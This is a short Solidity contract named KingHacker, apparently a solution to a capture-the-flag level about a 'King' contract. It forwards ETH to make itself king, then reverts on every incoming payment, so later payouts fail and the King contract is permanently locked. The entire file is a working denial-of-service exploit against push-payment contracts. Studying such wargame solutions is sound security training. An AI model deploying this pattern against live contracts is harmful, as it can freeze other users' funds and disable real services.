// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract KingHacker {
    // attack: call the King contract and send ETH from this contract
    // msg.value passed to this external call is forwarded to King.
    function attack(address payable kingContract) external payable {
        require(msg.value > 0, "send ETH to become king");

        // Forward the ETH to King from this contract address.
        // This will cause King.receive() to execute with msg.sender == address(this),
        // and King will set king = address(this) (if msg.value >= prize).
        (bool ok, ) = kingContract.call{value: msg.value}("");
        require(ok, "call to King failed");
    }

    // Once this contract is king, any transfer to it will revert and thus
    // break King's transfer -> causing King.receive() to revert.
    receive() external payable {
        revert("no ETH accepted");
    }

    fallback() external payable {
        revert("no ETH accepted");
    }
}